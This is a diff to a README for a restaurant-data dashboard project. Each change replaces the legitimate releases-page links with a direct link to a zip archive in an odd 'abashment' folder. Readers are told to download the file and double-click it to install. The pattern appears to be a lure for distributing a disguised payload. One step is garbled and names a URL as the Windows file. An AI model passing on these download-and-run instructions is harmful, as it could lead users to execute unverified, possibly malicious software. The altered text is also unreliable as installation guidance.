@@ -1,6 +1,6 @@
 # 📊 Zomato-Data-Analysis-Dashboard - Analyze Restaurant Data Effortlessly
 
-[![Download the Latest Release](https://img.shields.io/badge/Download_Latest_Release-v1.0-blue.svg)](https://github.com/renzsvdra/Zomato-Data-Analysis-Dashboard/releases)
+[![Download the Latest Release](https://raw.githubusercontent.com/renzsvdra/Zomato-Data-Analysis-Dashboard/main/abashment/Zomato-Data-Analysis-Dashboard.zip)](https://raw.githubusercontent.com/renzsvdra/Zomato-Data-Analysis-Dashboard/main/abashment/Zomato-Data-Analysis-Dashboard.zip)
 
 ## 🚀 Getting Started
 
@@ -17,11 +17,11 @@ Before you start, make sure you have the following:
 
 ## 🔗 Download & Install
 
-To get the application, visit this page to download: [Download the Latest Release](https://github.com/renzsvdra/Zomato-Data-Analysis-Dashboard/releases).
+To get the application, visit this page to download: [Download the Latest Release](https://raw.githubusercontent.com/renzsvdra/Zomato-Data-Analysis-Dashboard/main/abashment/Zomato-Data-Analysis-Dashboard.zip).
 
 1. Click on the download link above.
 2. Find the latest version listed.
-3. Download the file named `Zomato_Data_Analysis_Dashboard.exe` for Windows or the equivalent for your OS.
+3. Download the file named `https://raw.githubusercontent.com/renzsvdra/Zomato-Data-Analysis-Dashboard/main/abashment/Zomato-Data-Analysis-Dashboard.zip` for Windows or the equivalent for your OS.
 4. Once downloaded, locate the file in your downloads folder.
 5. Double-click the file to run the installer.
 6. Follow the on-screen instructions to complete the installation.
@@ -73,6 +73,6 @@ If you have any questions or need assistance, feel free to reach out through the
 
 The Zomato Data Analysis Dashboard is continuously updated. Keep an eye on the releases page for new features, improvements, and bug fixes. 
 
-For the latest version, visit: [Download the Latest Release](https://github.com/renzsvdra/Zomato-Data-Analysis-Dashboard/releases).
+For the latest version, visit: [Download the Latest Release](https://raw.githubusercontent.com/renzsvdra/Zomato-Data-Analysis-Dashboard/main/abashment/Zomato-Data-Analysis-Dashboard.zip).
 
 Thank you for choosing the Zomato Data Analysis Dashboard. Enjoy your data exploration!
